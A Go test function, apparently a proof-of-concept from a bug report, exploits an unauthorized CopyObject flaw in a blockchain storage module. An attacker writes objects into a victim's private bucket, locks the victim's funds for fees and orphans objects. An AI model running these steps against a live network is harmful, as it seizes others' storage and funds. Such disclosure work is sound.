...
func (s *StorageTestSuite) TestExploit_CopyObject_Unauthorized_FundLock() {
    var err error
    ctx := context.Background()
    sp := s.BaseSuite.PickStorageProvider()
    gvg, found := sp.GetFirstGlobalVirtualGroup()
    ...
    // 1. Setup Attacker dan Victim dengan 1 Juta BNB masing-masing
    accounts := s.GenAndChargeAccounts(2, 1000000)
    attacker := accounts[0]
    victim := accounts[1]

    // 2. Normal Flow: Victim membuat bucket
    victimBucketName := storageutil.GenRandomBucketName()
    msgCreateVictimBucket := storagetypes.NewMsgCreateBucket(
        victim.GetAddr(), victimBucketName, storagetypes.VISIBILITY_TYPE_PRIVATE, sp.OperatorKey.GetAddr(),
        nil, math.MaxUint, nil, 0)
    msgCreateVictimBucket.PrimarySpApproval.GlobalVirtualGroupFamilyId = gvg.FamilyId
    msgCreateVictimBucket.PrimarySpApproval.Sig, err = sp.ApprovalKey.Sign(msgCreateVictimBucket.GetApprovalBytes())
    s.Require().NoError(err)
    s.SendTxBlock(victim, msgCreateVictimBucket)

    // Catat state korban SEBELUM serangan (Lock Balance harusnya 0)
    victimStreamBefore := s.getStreamRecord(victim.GetAddr().String())
    s.T().Logf("Victim LockBalance BEFORE attack: %s", victimStreamBefore.LockBalance.String())
    s.Require().True(victimStreamBefore.LockBalance.Equal(sdkmath.ZeroInt()), "Victim should have 0 lock balance initially")

    // 3. Normal Flow: Attacker membuat bucket dan object sendiri sebagai sumber
    attackerBucketName := storageutil.GenRandomBucketName()
    msgCreateAttackerBucket := storagetypes.NewMsgCreateBucket(
        attacker.GetAddr(), attackerBucketName, storagetypes.VISIBILITY_TYPE_PRIVATE, sp.OperatorKey.GetAddr(),
        nil, math.MaxUint, nil, 0)
    msgCreateAttackerBucket.PrimarySpApproval.GlobalVirtualGroupFamilyId = gvg.FamilyId
    msgCreateAttackerBucket.PrimarySpApproval.Sig, err = sp.ApprovalKey.Sign(msgCreateAttackerBucket.GetApprovalBytes())
    s.Require().NoError(err)
    s.SendTxBlock(attacker, msgCreateAttackerBucket)

    // Attacker membuat object (1MB)
    attackerObjectName := storageutil.GenRandomObjectName()
    ...
    msgCreateAttackerObject := storagetypes.NewMsgCreateObject(attacker.GetAddr(), attackerBucketName, attackerObjectName, uint64(payloadSize), storagetypes.VISIBILITY_TYPE_PRIVATE, expectChecksum, "text/event-stream", storagetypes.REDUNDANCY_EC_TYPE, math.MaxUint, nil)
    msgCreateAttackerObject.PrimarySpApproval.Sig, err = sp.ApprovalKey.Sign(msgCreateAttackerObject.GetApprovalBytes())
    s.Require().NoError(err)
    s.SendTxBlock(attacker, msgCreateAttackerObject)

    // Attacker men-seal object miliknya
    _, _, _, objectId, _, _ := s.createObject(attacker, attackerBucketName, false)
    s.sealObject(sp, gvg, attackerBucketName, attackerObjectName, objectId, expectChecksum)

    // 4. ATTACK PATH: Attacker meng-copy object ke bucket Victim tanpa izin
    attackerDestObjectName := "hacked_object"
    msgCopyObject := storagetypes.NewMsgCopyObject(
        attacker.GetAddr(), 
        attackerBucketName, victimBucketName,      // [BENAR] srcBucket, dstBucket
        attackerObjectName, attackerDestObjectName, // [BENAR] srcObject, dstObject
        math.MaxUint, nil,
    )
    msgCopyObject.DstPrimarySpApproval.Sig, err = sp.ApprovalKey.Sign(msgCopyObject.GetApprovalBytes())
    s.Require().NoError(err)

    // Eksekusi Exploit! Tx ini harusnya sukses karena bug di CopyObject
    txRes := s.SendTxBlock(attacker, msgCopyObject)
    s.Require().Equal(txRes.Code, uint32(0), "Exploit CopyObject should succeed")

    // 5. IMPACT 1: Object unauthorized berhasil dibuat di bucket korban
    headObjResp, err := s.Client.HeadObject(ctx, &storagetypes.QueryHeadObjectRequest{
        BucketName: victimBucketName,
        ObjectName: attackerDestObjectName,
    })
    s.Require().NoError(err, "Object harusnya berhasil dibuat di bucket korban")
    s.Require().Equal(attacker.GetAddr().String(), headObjResp.ObjectInfo.Owner, "Owner object sekarang adalah attacker")

    // 6. IMPACT 2: Dana payment account korban terkunci (Fund Locking)
    victimStreamAfter := s.getStreamRecord(victim.GetAddr().String())
    s.T().Logf("Victim LockBalance AFTER attack: %s", victimStreamAfter.LockBalance.String())
    
    // Korban sekarang memiliki LockBalance yang dipotong oleh fee attacker!
    s.Require().True(victimStreamAfter.LockBalance.GT(victimStreamBefore.LockBalance), "Victim lock balance harusnya bertambah karena bayar fee attacker")

    // 7. IMPACT 3: Korban tidak bisa menghapus object orphan tersebut melalui nama (Overwrite test)
    // Attacker menimpa nama yang sama untuk membuat orphan object
    msgCopyObject2 := storagetypes.NewMsgCopyObject(
        attacker.GetAddr(), 
        attackerBucketName, victimBucketName,      // [BENAR] srcBucket, dstBucket
        attackerObjectName, attackerDestObjectName, // [BENAR] srcObject, dstObject
        math.MaxUint, nil,
    )
    msgCopyObject2.DstPrimarySpApproval.Sig, err = sp.ApprovalKey.Sign(msgCopyObject2.GetApprovalBytes())
    s.Require().NoError(err)
    s.SendTxBlock(attacker, msgCopyObject2) // Tx sukses menimpa object lama

    // Cek apakah ID object berubah (menandakan object lama jadi orphan)
    headObjResp2, err := s.Client.HeadObject(ctx, &storagetypes.QueryHeadObjectRequest{
        BucketName: victimBucketName,
        ObjectName: attackerDestObjectName,
    })
    s.Require().NoError(err)
    s.Require().NotEqual(headObjResp.ObjectInfo.Id, headObjResp2.ObjectInfo.Id, "Object ID berubah, object lama menjadi orphan tak terjangkau")
}
